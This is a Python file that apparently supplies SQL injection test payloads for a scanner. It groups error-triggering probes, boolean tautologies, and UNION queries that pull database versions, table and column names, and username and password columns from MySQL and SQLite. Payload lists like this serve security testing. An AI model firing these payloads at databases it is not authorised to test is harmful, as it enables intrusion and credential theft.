test_injections = {
	"error": [ # basic payloads using sql errors to identify if injection is possible
		"'",
		"''",
		"`",
		"``",
		",",
		'"',
		'""',
		"/",
		"//",
		"\\",
		"\\\\",
		";",
		"' or ",
		"-- or #",
		"' OR '1",
		"' OR 1 -- -",
		'" OR "" = "',
		'" OR 1 = 1 -- -',
		"' OR '' = '",
		"'='",
		"'LIKE'",
		"'=0--+",
		" OR 1=1",
		"' OR 'x'='x",
		"' AND id IS NULL; --",
		"'''''''''''''UNION SELECT '2",
		"%00",
		"/*…*/",
		# divide by zero
		"1/0",
		"1/0 --",
		"1/0 -- -",
		"AND (SELECT 1/0)",
		#non existent table
		"AND (SELECT * FROM non_existent_table)",
		#non existent column
		"AND (SELECT non_existent_column FROM users)",
		#boolen errors
		"' AND 1=1",
		"' AND 1=2",
		"' OR 1=1",
		"' OR 1=2",
		"' OR '1'='1",
		"' OR '1'='2",
	],
	"union": [
		"1 UNION SELECT NULL --",
		"1 UNION SELECT NULL, NULL --",
		"1 UNION SELECT NULL, NULL, NULL --",
		"1 UNION SELECT NULL, database(), version() --",  # MySQL specific
		"1 UNION SELECT NULL, sqlite_version(), NULL --",  # SQLite specific
		"1 UNION SELECT NULL, table_name, NULL FROM information_schema.tables -- ", # MySQL specific
		"1 UNION SELECT NULL, name, NULL FROM sqlite_master WHERE type='table' -- ", # SQLite specific
		"1 UNION SELECT NULL, CONCAT(table_name, ':', column_name), NULL FROM information_schema.columns WHERE table_schema=database() -- ", # MySQL specific
		"1 UNION SELECT NULL, sql, NULL FROM sqlite_master WHERE type='table' -- ", # SQLite specific
		"1 UNION SELECT NULL, table_name, column_name FROM information_schema.columns -- ",
		"1 UNION SELECT id, username, password FROM users -- ",
		"1 UNION SELECT schema_name, NULL, NULL FROM information_schema.schemata -- ", # MySQL specific
		"1 'UNION SELECT NULL --'",
		"1 'UNION SELECT NULL, NULL --'",
		"1 'UNION SELECT NULL, NULL, NULL --'",
		"1 'UNION SELECT NULL, database(), version() --'",  # MySQL specific
		"1 'UNION SELECT NULL, sqlite_version(), NULL --'",  # SQLite specific
		"1 'UNION SELECT NULL, table_name, NULL FROM information_schema.tables -- '", # MySQL specific
		"1 'UNION SELECT NULL, name, NULL FROM sqlite_master WHERE type='table' -- '", # SQLite specific
		"1 'UNION SELECT NULL, CONCAT(table_name, ':', column_name), NULL FROM information_schema.columns WHERE table_schema=database() -- '", # MySQL specific
		"1 'UNION SELECT NULL, sql, NULL FROM sqlite_master WHERE type='table' -- '", # SQLite specific
		"1 'UNION SELECT NULL, table_name, column_name FROM information_schema.columns -- '",
		"1 'UNION SELECT id, username, password FROM users -- '",
		"1 'UNION SELECT schema_name, NULL, NULL FROM information_schema.schemata -- '", # MySQL specific
		"1 'UNION SELECT NULL, NULL, NULL FROM information_schema.schemata -- '", # MySQL specific
	],
	"boolean": [
		"'OR' 1=1",
		"OR 1=1 --",  
		"' OR '1'='1' --'",  
		"\" OR \"1\"=\"1\" --",  
		"1 OR 1=1#",
		"' OR ' a'='a",
		"' OR ' a=a"
	]
}